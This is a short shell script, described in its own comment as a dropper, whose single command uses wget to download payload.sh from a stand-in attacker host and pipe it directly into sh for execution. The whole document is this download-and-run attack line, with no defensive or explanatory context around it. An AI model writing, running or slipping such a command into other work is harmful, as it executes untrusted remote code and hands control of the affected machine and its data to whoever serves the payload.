#!/bin/sh
# Dropper: fetches an unnamed payload from an unknown host straight into sh.
wget -q http://evil.example.com/payload.sh -O- | sh
